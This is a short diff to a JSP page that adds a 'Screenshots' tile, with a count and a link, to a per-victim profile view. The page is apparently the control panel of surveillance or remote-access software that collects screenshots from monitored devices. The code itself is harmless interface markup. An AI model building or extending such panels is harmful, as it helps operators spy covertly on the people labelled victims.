@@ -162,6 +162,17 @@
                 </a>
             </div>
 
+            <%--Screenshots--%>
+            <div class="col-lg-3">
+                <a href="<%=theVictim.getMediaScreenShotCount()>0 ? "/client/victim/" +victimCode + "/media/screenshots" : "#"%>">
+                    <div class="profile_grid <%=theVictim.getMediaScreenShotCount()==0 ? "inactive" : ""%>">
+                        <p class="profile_grid_main_title"><%=theVictim.getMediaScreenShotCount()%>
+                        </p>
+
+                        <p class="profile_grid_sub_title">Screenshots</p>
+                    </div>
+                </a>
+            </div>
 
         </div>
 
